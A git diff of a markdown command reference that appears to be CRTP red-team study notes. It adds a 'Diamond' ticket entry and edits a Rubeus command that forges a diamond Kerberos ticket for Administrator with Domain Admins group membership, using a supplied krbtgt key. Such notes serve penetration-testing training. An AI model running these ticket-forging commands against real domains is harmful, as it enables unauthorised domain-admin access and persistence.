@@ -29,6 +29,7 @@
   - [List Tickets, hash, and tgtdeleg](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#list-tickets)
   - [Pass-the-key/Over-PTH - asktgt and asktgs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#pass-the-keyover-pth)
   - [Golden](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#golden-1)
+  - [Diamond](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#diamond)
   - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver-1)
   - [S4U](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#s4u)
   - [Maintenance](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#maintenance)
@@ -626,7 +627,7 @@ optional:
 - ```/ptt``` - inject ticket
 
 ```
-rubeus.exe diamond /tgtdeleg /ticketuser:DAdmin /ticketuserid:500 /groups:512 /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C 
+rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C 
 ```
 
 
